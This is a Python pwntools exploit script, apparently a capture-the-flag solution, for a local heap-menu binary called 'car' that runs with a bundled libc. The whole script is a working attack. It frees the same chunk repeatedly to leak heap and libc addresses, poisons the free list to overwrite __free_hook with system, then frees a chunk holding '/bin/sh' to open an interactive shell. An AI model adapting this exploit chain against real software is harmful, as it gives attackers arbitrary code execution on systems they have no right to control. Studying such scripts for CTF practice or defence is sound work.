from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx,size,c='A',tp=1,color=1):
	cmd(1)
	cmd(tp)
	cmd(color)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	p.sendlineafter(": ",str(idx))
def free(idx):
	cmd(4)
	p.sendlineafter(": ",str(idx))
def edit(idx,size,c='A'):
	cmd(2)
	p.sendlineafter(": ",str(idx))
	cmd(2)
	p.sendlineafter(": ",str(size))
	p.sendafter(": ",c)
	cmd(3)
def show(idx):
	cmd(3)
	p.sendlineafter(": ",str(idx))
def leak(addr):
	edit(3,0x28,p64(3)*2+p64(0x100)+p64(addr))
	show(0)
	p.readuntil("ti: ")
	data=p.readuntil("\n===")[:-4]
	if len(data)==0:
		return '\0'
	else:
		#print data
		return data
#context.log_level='debug'
context.arch='amd64'
libc=ELF('./libc.so')
#p=remote('0.0.0.0',1024)
p=process("./car",env={"LD_PRELOAD":"./libc.so"})
p.sendlineafter(": ","n132")
p.sendlineafter(": ","n132")
add(0,0x88)
add(1,0x38)
for x in range(2):
	free(0)
show(0)
p.readuntil("ti: ")
heap=u64(p.readline()[:-1]+'\0\0')-0x6d0
log.warning(hex(heap))
for x in range(6):
	free(0)
show(0)
p.readuntil("ti: ")
base=u64(p.readline()[:-1]+'\0\0')
base=base-0x70-libc.sym['__malloc_hook']
log.warning(hex(base))
libc.address=base
edit(0,0x88,p64(libc.sym['__free_hook']-8))
add(2,0x88)
free(1)

#gdb.attach(p)
add(3,0x88,"/bin/sh\x00"+p64(libc.sym["system"]))
free(3)
p.interactive()
